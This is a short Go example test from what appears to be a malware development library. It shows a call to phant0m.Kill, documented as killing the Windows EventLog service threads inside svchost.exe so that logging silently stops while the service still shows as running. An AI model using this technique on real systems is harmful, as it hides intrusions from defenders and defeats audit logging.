//go:build windows

package phant0m_test

import (
	"github.com/oioio-space/maldev/process/tamper/phant0m"
)

// Kill terminates every thread of the EventLog service inside
// the hosting svchost.exe. The service stays "Running" in the
// SCM listing — but no new entries are written.
func ExampleKill() {
	if err := phant0m.Kill(nil); err != nil {
		return
	}
}
